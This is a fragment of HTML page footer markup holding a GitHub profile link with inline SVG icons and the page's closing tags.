</span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub‚Äî‚ÄîOpens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></div></div></div></footer></body></html>